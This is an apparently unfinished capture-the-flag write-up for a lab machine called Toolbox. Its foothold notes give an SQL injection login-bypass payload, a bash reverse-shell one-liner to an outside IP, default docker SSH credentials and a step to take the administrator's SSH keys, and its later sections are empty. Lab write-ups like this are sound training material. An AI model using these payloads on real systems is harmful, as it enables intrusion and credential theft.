Name & IP Address of Machine:
> TOOLBOX : `10.10.10.236`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->



## Synopsis


## Enumeration
Opened Ports: 
- [ ] 21 (FTP)
- [ ] 443 (HTTPS WEBSERVER)



## FootHold
- FTP anonymous login allowed. Only one file is there.
- On port 443, see the certificate and you get to know about a vhost `admin.megalogistic.com`
- Login page has sql injection.(confirm it with a single quote)
- Use password `admin') OR 1=1-- -` and login success.
- Todo list on the dashboard.php page. Possible username `tony`
    ```bash
    ToDo List

    Send credentials to Tony
    Update Printer Drivers

    Administrator
    ```
- 
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.28/9009 0>&1'
ssh docker@172.17.0.1 # docker:tcuser
Grab ssh keys of admintrator

```

```bash

```

## Lateral Movement

## Privilege Escalation




<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->